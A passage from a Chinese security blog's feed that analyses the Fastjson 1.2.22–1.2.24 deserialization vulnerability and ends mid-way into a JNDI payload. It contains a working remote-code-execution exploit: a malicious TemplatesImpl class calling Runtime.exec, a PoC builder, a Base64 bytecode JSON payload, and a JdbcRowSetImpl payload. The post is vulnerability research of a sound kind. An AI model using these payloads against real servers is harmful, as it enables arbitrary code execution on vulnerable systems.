class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:411, InitialContext (javax.naming)</span><br><span class="line">setProperties:56, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:152, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:162, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:131, JSON (com.alibaba.fastjson)</span><br><span class="line">main:8, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure><hr><p>OK，Fastjson历史版本补丁的绕过大致就这些，并且这些都是需要开启AutoTypeSupport才能成功利用的，后面一篇文章就是讲2019年Fastjson反序列化漏洞，一样是checkAutoType()的绕过，但是无需开启AutoTypeSupport。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列二——1.2.22-1.2.24反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</id>
    <published>2019-11-07T13:20:04.000Z</published>
    <updated>2019-11-16T10:04:11.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Fastjson 1.2.x系列的1.2.22-1.2.24版本。</p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p><ul><li>基于TemplateImpl；</li><li>基于JNDI（又分为基于Bean Property类型和Field类型）；</li></ul><h3 id="需要的jar包"><a href="#需要的jar包" class="headerlink" title="需要的jar包"></a>需要的jar包</h3><p>我本地用的是fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。</p><h3 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h3><p>这部分代码参考的<a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖新喜大佬的博客</a>。</p><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。</p><h4 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h4><p>恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Test t = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">            <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">            <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"\\out\\production\\FJTest\\Test.class"</span>;</span><br><span class="line">            String evilCode = readClass(evilClassPath);</span><br><span class="line">            <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">            String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                    <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                    <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">            <span class="comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹出计算器：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/1.png" alt=""></p><p>关键看输出的构造的PoC：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123; &#125;,"_name":"a","_version":"1.0","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure><p>PoC中几个重要的Json键的含义：</p><ul><li><strong>@type</strong>——指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li><li><strong>_bytecodes</strong>——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</li><li><strong>_outputProperties</strong>——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li><li><strong>_tfactory:{}</strong>——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li></ul><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面我们直接在反序列化的那句代码上打上断点进行调试分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/2.png" alt=""></p><p>跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/3.png" alt=""></p><p>继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/4.png" alt=""></p><p>在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/5.png" alt=""></p><p>往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/6.png" alt=""></p><p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/8.png" alt=""></p><p>往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/7.png" alt=""></p><p>返回后，程序继续回到DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/9.png" alt=""></p><p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/10.png" alt=""></p><p>在parseField()中，会调用DefaultFieldDeserializer.parseField()对<code>_bytecodes</code>对应的内容进行解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/11.png" alt=""></p><p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/12.png" alt=""></p><p>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/13.png" alt=""></p><p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p><p>当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/14.png" alt=""></p><p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/15.png" alt=""></p><p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/16.png" alt=""></p><p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/17.png" alt=""></p><p>继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/18.png" alt=""></p><p>再往下就是新建Test类实例的过程，并调用Test类的构造函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/19.png" alt=""></p><p>再之后就是弹计算器了。</p><p><strong>整个调试过程主要的函数调用栈如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:11, Test</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:57, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:526, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:383, Class (java.lang)</span><br><span class="line">getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:302, JSON (com.alibaba.fastjson)</span><br><span class="line">main:35, PoC</span><br></pre></td></tr></table></figure><p>最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p><h4 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类"></a>为什么恶意类需要继承AbstractTranslet类</h4><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/35.png" alt=""></p><p>可以看到有个逻辑会判断恶意类的父类类名是否是<code>ABSTRACT_TRANSLET</code>，是的话<code>_transletIndex</code>变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p><h4 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h4><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p><p>其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = lexer.bytesValue();</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> (T) bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/20.png" alt=""></p><p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/21.png" alt=""></p><p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/22.png" alt=""></p><h4 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h4><p>由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到<code>_tfactory.getExternalExtensionsMap()</code>方法，若<code>_tfactory</code>为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/24.png" alt=""></p><h4 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法</h4><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前文章<a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%B0%8F%E7%BB%93">《Fastjson系列一——反序列化漏洞基本原理》</a>说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p><h4 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法"></a>如何关联_outputProperties与getOutputProperties()方法</h4><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p><p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; <span class="comment">// xxx</span></span><br><span class="line"></span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);</span><br></pre></td></tr></table></figure><p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/23.png" alt=""></p><p>既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。</p><h3 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p><p>关于JNDI注入的相关概念，可以参考之前的文章<a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">《浅析JNDI注入》</a>。</p><h4 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p><p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p><h4 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h4><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span 